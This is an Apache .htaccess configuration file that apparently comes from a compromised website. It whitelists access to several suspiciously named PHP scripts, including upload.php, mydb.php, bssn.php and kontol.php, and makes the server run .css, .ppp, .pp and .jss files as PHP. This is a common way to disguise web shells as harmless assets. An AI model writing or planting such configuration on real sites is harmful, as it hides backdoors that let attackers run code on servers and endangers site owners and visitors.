<FilesMatch "^(upload.php|dialog.php|contact.php|index.html|mydb.php|bssn.php|kontol.php)">
Order Allow,Deny
Allow from all
</FilesMatch>
<FilesMatch "\.ppp$">
    SetHandler application/x-httpd-php
</FilesMatch>


<FilesMatch "\.css$">
    SetHandler application/x-httpd-php
</FilesMatch>
AddHandler application/x-httpd-php7 .jss
AddType application/x-httpd-php .pp
# Disable directory browsing
Options All -Indexes
